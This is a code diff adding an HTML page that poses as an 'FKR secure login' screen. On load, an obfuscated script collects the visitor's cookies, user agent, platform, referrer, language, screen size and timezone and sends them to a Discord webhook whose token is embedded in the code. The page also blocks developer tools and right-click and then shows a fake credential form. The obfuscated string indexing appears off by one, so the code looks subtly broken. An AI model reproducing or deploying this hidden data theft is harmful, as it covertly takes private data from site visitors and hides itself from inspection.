@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>FKR Access</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            background: #000;
+            height: 100%;
+            color: #0f0;
+            font-family: monospace;
+        }
+        .container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+        }
+        .dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: #0f0;
+            border-radius: 50%;
+            margin: 0 5px;
+            animation: pulse 1.5s infinite ease-in-out;
+        }
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
+        @keyframes pulse {
+            0%, 100% { opacity: 0.2; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1.2); }
+        }
+        .text {
+            margin-top: 30px;
+            font-size: 14px;
+            letter-spacing: 2px;
+        }
+    </style>
+</head>
+<body oncontextmenu="return false;" onkeydown="if(event.keyCode==123){return false;}" ondragstart="return false;" onselectstart="return false;">
+    <div class="container">
+        <div>
+            <span class="dot"></span>
+            <span class="dot"></span>
+            <span class="dot"></span>
+        </div>
+        <div class="text">FKR SECURE LOGIN INITIALIZING</div>
+    </div>
+
+    <script>
+        // Disable F12, Ctrl+Shift+I, Ctrl+U, etc.
+        document.addEventListener('keydown', function(e) {
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.ctrlKey && e.shiftKey && e.keyCode == 74) || (e.ctrlKey && e.keyCode == 85)) {
+                e.preventDefault();
+                return false;
+            }
+        });
+        // Obfuscated data collection and sending
+        (function(){
+            var _0x1a2b=['webhooks/1465638053178638368/PUa4Dm8GQyGFw6GPk62Lw76fnN7ehRb7Xw0b9VGjEFOiwwMpwPaocTz77f8BFVWYIXod','stringify','POST','content','application/json','href','cookie','userAgent','platform','referrer','language','width','height','timeZone','toISOString','then','catch'];var _0x3a8f=function(_0x1a2b80,_0x3a8f89){_0x1a2b80=_0x1a2b80-0x0;var _0x5086d7=_0x1a2b[_0x1a2b80];return _0x5086d7;};
+            var _0x4dccf3={};_0x4dccf3[_0x3a8f('0x0')]=document[_0x3a8f('0x1')];_0x4dccf3[_0x3a8f('0x2')]=navigator[_0x3a8f('0x2')];_0x4dccf3[_0x3a8f('0x3')]=navigator[_0x3a8f('0x3')];_0x4dccf3['url']=window.location[_0x3a8f('0x4')];_0x4dccf3[_0x3a8f('0x5')]=document[_0x3a8f('0x5')];_0x4dccf3[_0x3a8f('0x6')]=navigator[_0x3a8f('0x6')];_0x4dccf3['screen']=screen[_0x3a8f('0x7')]+'x'+screen[_0x3a8f('0x8')];_0x4dccf3['timezone']=Intl.DateTimeFormat().resolvedOptions()[_0x3a8f('0x9')];_0x4dccf3['timestamp']=new Date()[_0x3a8f('0xa')]();
+            var _0x2b5a24={};_0x2b5a24[_0x3a8f('0xb')]='**Browser Data**\x0a```json\x0a'+JSON[_0x3a8f('0xc')](_0x4dccf3,null,0x2)+'\x0a```';
+            fetch('https://discord.com/api/'+_0x3a8f('0xd'),{method:_0x3a8f('0xe'),headers:{'Content-Type':_0x3a8f('0xf')},body:JSON[_0x3a8f('0xc')](_0x2b5a24)})[_0x3a8f('0x10')](()=>{})[_0x3a8f('0x11')](()=>{});
+        })();
+        // Simulate login form appearing after 2 seconds
+        setTimeout(function() {
+            document.querySelector('.container').innerHTML = '<div class="text">ENTER CREDENTIALS</div><input type="text" id="user" placeholder="username" style="background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 10px; width: 200px;"><br><input type="password" id="pass" placeholder="password" style="background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 10px; width: 200px;"><br><button onclick="alert(\'Login failed. Connection lost.\')" style="background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 10px;">LOGIN</button>';
+        }, 2000);
+    </script>
+    <noscript>Please enable JavaScript to access FKR.</noscript>
+</body>
+</html>
+<!-- Source obfuscated. FKR Security Layer v3.14 -->
